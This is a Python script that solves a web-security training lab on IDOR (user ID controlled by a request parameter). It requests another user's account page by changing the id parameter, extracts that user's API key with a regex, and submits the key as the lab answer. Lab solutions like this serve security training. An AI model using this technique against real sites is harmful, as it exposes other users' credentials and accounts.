import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "User ID controlled by request parameter"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the carlos profile using id URL parameter\n2. Extract the API key\n3. Submit the solution\n""")

    print(Fore.WHITE + "[1] Fetching carlos profile page")

    carlos_profile = requests.get(
        f"{url}/my-account?id=carlos", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[2] Extracting the API key")
    api_key = re.findall("Your API Key is: (.*)</div>", carlos_profile.text)[0]
    print(Fore.GREEN + "API key" + Fore.WHITE + " => " + Fore.YELLOW + api_key)
    data = {"answer": api_key}

    print(Fore.WHITE + "[3] Submitting the solution")

    try:
        r = requests.post(
            f"{url}/submitSolution", data=data, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
